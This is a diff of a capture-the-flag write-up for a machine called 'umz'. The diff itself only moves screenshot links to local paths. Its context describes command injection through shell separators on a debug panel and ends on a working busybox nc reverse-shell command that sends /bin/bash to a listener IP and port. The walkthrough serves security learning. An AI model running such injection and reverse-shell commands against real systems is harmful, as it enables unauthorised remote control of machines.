@@ -119,9 +119,9 @@ We then accessed the website hosted on `http://$IP:8080` and were greeted with a
 
 So we're going to see a command prompt.
 
-[![ system panel for debug the umz machine](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-05-034828-1.png)](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-05-034828-1.png)Next, we attempted a command injection by using special characters like `&&` , `\n` and , **`;`** and`|` to try and execute additional commands. Fortunately, one of these attempts worked successfully. I remember this was the same thing done on the DVWA platform.
+[![ system panel for debug the umz machine](/mdx_images/2025/06/Screenshot-2025-06-05-034828-1.png)](/mdx_images/2025/06/Screenshot-2025-06-05-034828-1.png)Next, we attempted a command injection by using special characters like `&&` , `\n` and , **`;`** and`|` to try and execute additional commands. Fortunately, one of these attempts worked successfully. I remember this was the same thing done on the DVWA platform.
 
-[![command injection for umz machine](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-05-035028.png)](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-05-035028.png)Next, we tried to obtain a reverse shell. After testing several payloads, this one worked:
+[![command injection for umz machine](/mdx_images/2025/06/Screenshot-2025-06-05-035028.png)](/mdx_images/2025/06/Screenshot-2025-06-05-035028.png)Next, we tried to obtain a reverse shell. After testing several payloads, this one worked:
 
 ```bash
 busybox nc 192.168.138.102 4445 -e /bin/bash
